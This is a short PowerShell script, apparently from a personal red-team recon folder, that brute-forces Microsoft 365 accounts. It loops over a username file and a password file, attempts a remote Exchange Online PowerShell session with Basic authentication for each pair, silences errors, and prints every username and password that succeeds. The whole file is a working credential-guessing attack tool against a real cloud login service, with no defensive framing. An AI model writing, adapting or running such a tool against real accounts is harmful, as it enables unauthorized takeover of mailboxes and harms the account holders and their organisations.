﻿cls

Write-Host -ForegroundColor Yellow -Object "$(Get-Date) - Starting script..."

$usersList = Get-Content 'C:\Users\JeffL\Desktop\att&ck\-1. ExternalRecon\BruteForceTool\NinjaUsers.txt'
$passwordList = Get-Content 'C:\Users\JeffL\Desktop\att&ck\-1. ExternalRecon\BruteForceTool\passwordlist.txt'

foreach ($user in $usersList) {

    Write-Host -ForegroundColor Cyan $user

    foreach ($pwd in $passwordList) {

        $password = ConvertTo-SecureString $pwd -AsPlainText -Force
        $UserCredential = New-Object System.Management.Automation.PSCredential ($user, $password)
        
        $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $UserCredential -Authentication Basic -AllowRedirection -ErrorAction SilentlyContinue
        
        if($Session -ne $null) {
            
            Write-Host -ForegroundColor Green -Object "Password found for user $user - Password: $pwd"        
        }


    }

}

Write-Host -ForegroundColor Yellow -Object "$(Get-Date) - Execution complete ..."